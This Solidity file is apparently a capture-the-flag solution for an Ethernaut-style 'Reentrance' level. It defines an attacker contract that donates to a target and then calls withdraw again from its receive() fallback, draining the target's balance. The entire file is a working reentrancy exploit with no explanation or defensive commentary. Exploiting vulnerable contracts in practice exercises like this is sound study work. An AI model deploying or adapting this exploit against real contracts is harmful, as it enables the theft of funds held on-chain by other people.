// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/reentrance/Reentrance.sol";

contract ReentranceAttacker {
    Reentrance public reentrance;
    uint256 public amount;

    constructor(address _target) {
        reentrance = Reentrance(payable(_target));
    }

    function attack() external payable {
        amount = msg.value;
        reentrance.donate{value: amount}(address(this));
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if(address(reentrance).balance >= amount){
            reentrance.withdraw(amount);
        }
    }
}

